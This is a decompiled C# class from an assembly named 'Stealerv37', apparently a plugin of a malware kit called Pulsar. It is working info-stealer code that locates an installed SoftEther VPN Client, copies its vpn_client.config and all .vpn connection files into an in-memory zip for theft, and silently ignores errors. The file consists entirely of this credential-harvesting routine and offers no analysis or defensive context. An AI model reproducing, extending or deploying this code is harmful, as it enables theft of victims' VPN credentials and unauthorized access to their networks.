// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.SoftEther
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Vpn;

public class SoftEther : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "SoftEther VPN Client");
    if (!Directory.Exists(str))
      return;
    string path2 = nameof (SoftEther);
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "SoftEther VPN";
    string path = Path.Combine(str, "vpn_client.config");
    if (File.Exists(path))
    {
      try
      {
        string entryPath = Path.Combine("Vpn", path2, "vpn_client.config");
        zip.AddFile(entryPath, File.ReadAllBytes(path));
        counterApplications.Files.Add($"{path} => {entryPath}");
      }
      catch
      {
      }
    }
    foreach (string file in Directory.GetFiles(str, "*.vpn", SearchOption.TopDirectoryOnly))
    {
      try
      {
        string fileName = Path.GetFileName(file);
        string entryPath = Path.Combine("Vpn", path2, fileName);
        zip.AddFile(entryPath, File.ReadAllBytes(file));
        counterApplications.Files.Add($"{file} => {entryPath}");
      }
      catch
      {
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add(Path.Combine("Vpn", path2));
    counter.Vpns.Add(counterApplications);
  }
}
